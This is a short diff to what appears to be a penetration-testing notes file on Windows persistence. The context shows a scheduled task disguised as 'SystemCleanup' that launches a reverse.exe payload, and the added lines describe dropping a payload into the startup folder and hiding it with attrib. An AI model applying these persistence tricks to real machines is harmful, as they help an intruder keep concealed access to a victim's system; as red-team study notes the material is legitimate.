@@ -246,3 +246,12 @@ schtasks /create /tn "SystemCleanup" /tr "C:\users\fcastle\Downloads\reverse.exe
 #delete task
 schtasks /delete /tn "SystemCleanup" /f
 ```
+
+### Using Shell Startup
+```bash
+Win+R
+
+shell:startup
+
+Place your payload and hide with attrib command if you want
+```
